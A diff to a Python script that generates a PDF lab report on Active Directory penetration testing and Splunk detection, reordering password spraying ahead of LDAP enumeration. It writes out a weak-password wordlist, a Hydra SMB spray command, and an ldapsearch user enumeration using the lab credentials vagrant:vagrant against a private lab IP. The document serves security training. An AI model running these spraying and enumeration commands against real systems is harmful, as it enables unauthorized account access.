@@ -103,7 +103,7 @@ story.append(PageBreak())
 # ============ 1. EXECUTIVE SUMMARY ============
 story.append(Paragraph("1. EXECUTIVE SUMMARY", H1))
 story.append(Paragraph("This project demonstrates a realistic multi stage reconnaissance and Active Directory penetration testing exercise, coupled with comprehensive SIEM detection engineering using Splunk Enterprise. I built this lab to bridge the gap between offensive and defensive security by executing a full attack chain from the Red Team perspective, then building detection capabilities from the Blue Team perspective.", BODY))
-story.append(Paragraph("The attack simulation followed a typical adversary progression: social engineering for username acquisition, network reconnaissance, service enumeration, LDAP user discovery, password spraying with Hydra, successful authentication, and post compromise privilege enumeration. Every phase was detected through carefully crafted SPL queries, real time dashboards, and automated alerts.", BODY))
+story.append(Paragraph("The attack simulation followed a typical adversary progression: social engineering for username acquisition, network reconnaissance, password spraying with Hydra, successful authentication, LDAP enumeration, and post compromise privilege enumeration. Every phase was detected through carefully crafted SPL queries, real time dashboards, and automated alerts.", BODY))
 story.append(Paragraph("Key Findings", H3))
 fd = [["Finding","Severity","Evidence"],
     ["Weak password policy","CRITICAL","vagrant:vagrant valid"],
@@ -167,9 +167,9 @@ md = [["Tactic","Technique ID","Technique Name","Lab Application"],
     ["Initial Access","T1566","Phishing","Username acquisition via social engineering"],
     ["Reconnaissance","T1046","Network Service Scanning","Nmap scan against DC"],
     ["Reconnaissance","T1018","Remote System Discovery","Host enumeration"],
-    ["Discovery","T1087","Account Discovery","LDAP user enumeration"],
     ["Credential Access","T1110","Brute Force","Hydra password spray"],
     ["Initial Access","T1078","Valid Accounts","vagrant:vagrant auth"],
+    ["Discovery","T1087","Account Discovery","LDAP user enumeration"],
     ["Credential Access","T1003.001","LSASS Memory","LSASS NTLM handling"],
     ["Discovery","T1033","System Owner Discovery","whoami /priv"],
     ["Lateral Movement","T1021.002","SMB/Admin Shares","NetExec SMB exec"],
@@ -206,7 +206,34 @@ story.append(Paragraph("Results: Host is alive with low latency. Open ports incl
 add_screenshot("Nmap Scan.png", 15*cm)
 story.append(Paragraph("Screenshot 2: Nmap scan results showing open AD services.", CAP))
 
-story.append(Paragraph("4.3 Phase 3: LDAP Enumeration", H2))
+story.append(Paragraph("4.3 Phase 3: Credential Access via Password Spraying", H2))
+story.append(Paragraph("Objective: Find valid credentials by testing common passwords against the vagrant account. Password spraying differs from brute force: instead of thousands of passwords against one account, I tested a few common passwords against one account. This avoids account lockout thresholds.", BODY))
+story.append(Paragraph("In this lab, I targeted one account only: vagrant.", BODY))
+
+story.append(Paragraph("Step 1 — Create Password List:", H3))
+story.append(Preformatted('cat > /tmp/passwordlist << EOF\npassword\n123456\n12345678\nqwerty\nabc123\nmonkey\nletmein\ndragon\n111111\nbaseball\niloveyou\ntrustno1\nsunshine\nprincess\nadmin\nwelcome\nshadow\nashley\nfootball\njesus\nmichael\nninja\nmustang\npassword1\n123456789\ndiamond\nadmin123\nletmein1\nphotoshop\nqwerty123\nqaz123wsx\nqwertyuiop\nlogin\nmaster\nhello\nfreedom\nwhatever\nqazxsw\ntrustno1\nbatman\npassw0rd\nhacker\nvagrant\nEOF', CODE))
+add_screenshot("Passwordlist Creation.png", 15*cm)
+story.append(Paragraph("Screenshot 3: Password list creation showing commonly used weak passwords.", CAP))
+
+story.append(Paragraph("Step 2 — Verify the Password List:", H3))
+story.append(Preformatted("ls -la /tmp/passwordlist\nwc -l /tmp/passwordlist", CODE))
+add_screenshot("Passwordlist Check.png", 15*cm)
+story.append(Paragraph("Screenshot 4: Verifying the password list file was created correctly.", CAP))
+
+story.append(Paragraph("Step 3 — Execute Password Spray with Hydra:", H3))
+story.append(Preformatted("hydra -l vagrant -P /tmp/passwordlist smb://192.168.56.102", CODE))
+story.append(Paragraph("Parameter Explanation:", H3))
+story.append(Paragraph("<b>hydra</b> — The THC Hydra password cracking tool.<br/>"
+    "<b>-l vagrant</b> — Single username to test.<br/>"
+    "<b>-P /tmp/passwordlist</b> — Path to password list file.<br/>"
+    "<b>smb://192.168.56.102</b> — Target protocol and IP address.", BODY))
+story.append(Paragraph("Results: Valid credential pair discovered: vagrant:vagrant. Authentication succeeded via SMB using NTLM.", BODY))
+add_screenshot("Hydra-Brute-Force-Successful.png", 15*cm)
+story.append(Paragraph("Screenshot 5: Hydra successful password spray showing valid credentials.", CAP))
+
+story.append(PageBreak())
+
+story.append(Paragraph("4.4 Phase 4: LDAP Enumeration", H2))
 story.append(Paragraph("Objective: Extract user accounts and directory information using LDAP queries. LDAP is the protocol Windows uses to query Active Directory.", BODY))
 story.append(Paragraph("Command Used:", H3))
 story.append(Preformatted('ldapsearch -x -H ldap://192.168.56.102 -D "windomain\\vagrant" -w "vagrant" -b "dc=windomain,dc=local" "(&(objectclass=user)(SAMAccountName=*))" | grep sAMAccountName', CODE))
@@ -220,34 +247,7 @@ story.append(Paragraph("<b>-x</b> — Use simple authentication.<br/>"
     "<b>| grep sAMAccountName</b> — Filter output to usernames.", BODY))
 story.append(Paragraph("Results: Successfully enumerated domain user accounts.", BODY))
 add_screenshot("ldapsearch query.correct.png", 15*cm)
-story.append(Paragraph("Screenshot 3: LDAP enumeration showing successful bind and user discovery.", CAP))
-
-story.append(PageBreak())
-
-story.append(Paragraph("4.4 Phase 4: Credential Access via Password Spraying", H2))
-story.append(Paragraph("Objective: Find valid credentials by testing common passwords against the vagrant account. Password spraying differs from brute force: instead of thousands of passwords against one account, I tested a few common passwords against one account. This avoids account lockout thresholds.", BODY))
-story.append(Paragraph("In this lab, I targeted one account only: vagrant.", BODY))
-
-story.append(Paragraph("Step 1 — Create Password List:", H3))
-story.append(Preformatted('cat > /tmp/passwordlist << EOF\npassword\n123456\n12345678\nqwerty\nabc123\nmonkey\nletmein\ndragon\n111111\nbaseball\niloveyou\ntrustno1\nsunshine\nprincess\nadmin\nwelcome\nshadow\nashley\nfootball\njesus\nmichael\nninja\nmustang\npassword1\n123456789\ndiamond\nadmin123\nletmein1\nphotoshop\nqwerty123\nqaz123wsx\nqwertyuiop\nlogin\nmaster\nhello\nfreedom\nwhatever\nqazxsw\ntrustno1\nbatman\npassw0rd\nhacker\nvagrant\nEOF', CODE))
-add_screenshot("Passwordlist Creation.png", 15*cm)
-story.append(Paragraph("Screenshot 4: Password list creation showing commonly used weak passwords.", CAP))
-
-story.append(Paragraph("Step 2 — Verify the Password List:", H3))
-story.append(Preformatted("ls -la /tmp/passwordlist\nwc -l /tmp/passwordlist", CODE))
-add_screenshot("Passwordlist Check.png", 15*cm)
-story.append(Paragraph("Screenshot 5: Verifying the password list file was created correctly.", CAP))
-
-story.append(Paragraph("Step 3 — Execute Password Spray with Hydra:", H3))
-story.append(Preformatted("hydra -l vagrant -P /tmp/passwordlist smb://192.168.56.102", CODE))
-story.append(Paragraph("Parameter Explanation:", H3))
-story.append(Paragraph("<b>hydra</b> — The THC Hydra password cracking tool.<br/>"
-    "<b>-l vagrant</b> — Single username to test.<br/>"
-    "<b>-P /tmp/passwordlist</b> — Path to password list file.<br/>"
-    "<b>smb://192.168.56.102</b> — Target protocol and IP address.", BODY))
-story.append(Paragraph("Results: Valid credential pair discovered: vagrant:vagrant. Authentication succeeded via SMB using NTLM.", BODY))
-add_screenshot("Hydra-Brute-Force-Successful.png", 15*cm)
-story.append(Paragraph("Screenshot 6: Hydra successful password spray showing valid credentials.", CAP))
+story.append(Paragraph("Screenshot 6: LDAP enumeration showing successful bind and user discovery.", CAP))
 
 story.append(Paragraph("4.5 Phase 5: Post Compromise Enumeration", H2))
 story.append(Paragraph("Objective: Verify access level and enumerate privileges on the compromised system.", BODY))
